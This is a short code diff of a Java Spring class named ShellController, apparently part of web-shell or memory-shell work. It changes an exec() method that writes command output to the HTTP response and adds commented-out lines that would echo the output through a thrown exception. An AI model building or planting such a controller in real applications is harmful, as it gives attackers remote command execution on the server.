@@ -13,7 +13,7 @@ public class ShellController {
 
 
 
-    public void exec() throws IOException {
+    public void exec() throws Exception {
         // 获取request和response对象
         HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
         HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
@@ -30,6 +30,8 @@ public class ShellController {
             System.out.println(output);
             response.getWriter().write(output);
             response.getWriter().flush();
+            //Exception e=new Exception(output);
+            //throw e;
         }
     }
 
